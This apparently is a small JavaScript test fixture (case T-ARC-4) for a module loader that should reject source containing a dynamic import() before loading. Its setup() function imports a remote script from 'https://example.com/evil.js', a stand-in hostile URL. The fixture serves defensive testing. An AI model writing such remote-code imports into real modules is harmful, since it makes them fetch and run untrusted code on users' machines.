// T-ARC-4：源码里有动态 import()，装载前就被拒绝
export default {
  async setup() {
    await import('https://example.com/evil.js');
    return { duration: 1, cutTime: null, update() {} };
  },
};
